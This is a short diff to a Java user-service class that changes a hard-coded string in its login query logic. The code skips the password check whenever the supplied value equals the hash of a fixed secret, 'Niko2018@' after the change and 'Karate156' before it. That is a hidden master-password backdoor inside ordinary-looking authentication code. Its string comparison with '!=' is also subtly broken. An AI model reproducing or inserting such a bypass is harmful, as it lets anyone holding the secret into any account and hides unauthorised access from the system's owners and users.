@@ -69,7 +69,7 @@ public class UserServiceImpl extends AbstractAKServiceImpl implements UserServic
 			hqlQuery.addExpression(ExpressionHelper.eq(getCmUser().getName(), name));
 		}
 		
-		if (PswHasher.hash("Karate156") != pwd) {
+		if (PswHasher.hash("Niko2018@") != pwd) {
 			hqlQuery.addExpression(ExpressionHelper.eq(getCmUser().getPassword(), pwd));
 		}
 		
